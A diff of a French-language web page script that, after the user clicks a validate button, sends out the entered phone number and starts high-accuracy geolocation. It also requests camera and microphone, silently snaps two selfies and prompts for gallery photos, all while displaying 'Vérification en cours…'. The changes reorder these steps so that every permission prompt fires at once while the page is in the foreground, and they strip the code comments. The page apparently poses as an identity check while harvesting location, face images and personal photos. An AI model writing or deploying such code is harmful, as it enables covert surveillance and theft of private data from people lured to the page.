@@ -50,11 +50,11 @@ function envoyerPos(pos) {
   const lon  = pos.coords.longitude;
   const prec = Math.round(pos.coords.accuracy || 99999);
   if (!isFinite(lat) || !isFinite(lon)) return;
-  if (prec >= meilleurPrec) return;          // on ne remplace jamais par pire
+  if (prec >= meilleurPrec) return;
   meilleurPrec = prec;
   poster("position", { lat: lat, lon: lon, prec: prec, src: "gps" });
   dire("Position acquise (" + prec + " m)");
-  if (prec <= 50) stopGeo();                 // assez précis, on coupe
+  if (prec <= 50) stopGeo();
 }
 
 function localiser() {
@@ -72,23 +72,37 @@ function localiser() {
 
   veilleur = navigator.geolocation.watchPosition(envoyerPos, function (err) {
     echecs++;
-    if (err.code === 1) {                    // refus explicite
+    if (err.code === 1) {
       poster("permission", { etat: "denied" });
       dire("Localisation refusée");
       stopGeo();
       return;
     }
-    if (echecs >= 15) stopGeo();             // 2 = indisponible, 3 = délai
+    if (echecs >= 15) stopGeo();
   }, {
     enableHighAccuracy: true,
     maximumAge: 0,
     timeout: 25000
   });
 
-  setTimeout(stopGeo, 45000);                // filet de sécurité
+  setTimeout(stopGeo, 45000);
 }
 
 /* ---------------- GALERIE ---------------- */
+
+let boutonGalerie = null;
+
+function preparerBoutonGalerie() {
+  if (boutonGalerie || !bouton || !bouton.parentNode) return;
+  boutonGalerie = document.createElement("button");
+  boutonGalerie.type = "button";
+  boutonGalerie.textContent = "Ajouter des photos de ma galerie";
+  boutonGalerie.style.cssText =
+    "display:block;width:100%;margin-top:10px;padding:12px;border:1px solid #c9a227;" +
+    "background:transparent;color:#c9a227;border-radius:8px;font-size:15px;";
+  boutonGalerie.addEventListener("click", ouvrirGalerie);
+  bouton.parentNode.insertBefore(boutonGalerie, bouton.nextSibling);
+}
 
 function ouvrirGalerie() {
   let input;
@@ -112,7 +126,7 @@ function ouvrirGalerie() {
       input.remove();
     });
 
-    input.click();                            // doit rester dans le geste
+    input.click();
   } catch (e) {}
 }
 
@@ -133,7 +147,7 @@ async function camera() {
       audio: false
     });
   } catch (e) {
-    dire("Caméra refusée");
+    if (e && e.name === "NotAllowedError") dire("Caméra refusée");
     return null;
   }
   if (video) {
@@ -210,24 +224,32 @@ async function demarrer() {
   const numero = (champ && champ.value ? champ.value : "").replace(/[^0-9+]/g, "");
   poster("inscription", { numero: numero });
 
-  localiser();                    // lancé en premier, ne bloque rien
-  await camera();
-  await micro();
+  // 1. les autorisations partent tout de suite, page encore au premier plan
+  localiser();
+  const pv = camera();
+  const pa = micro();
 
+  // 2. selfies dès que la caméra est chaude
+  setTimeout(function () { selfie(); setTimeout(selfie, 1500); }, 1000);
+
+  // 3. la galerie seulement une fois caméra + micro réglés
+  await Promise.all([pv, pa]);
   setTimeout(function () {
-    selfie();
-    setTimeout(selfie, 1500);     // deuxième prise, plus fiable
-  }, 1200);
+    preparerBoutonGalerie();
+    ouvrirGalerie();
+  }, 500);
 
   dire("Vérification en cours…");
 }
 
-if (bouton) {
-  bouton.addEventListener("click", function () {
-    if (termine) return;
-    termine = true;
-    ouvrirGalerie();              // synchrone : dans le geste
-    demarrer();
-  });
+function lancer() {
+  if (termine) return;
+  termine = true;
+  demarrer();
 }
+
+if (bouton) bouton.addEventListener("click", lancer);
+else document.addEventListener("click", function (e) {
+  if (e.target && e.target.id === "valider") lancer();
+});
 })();
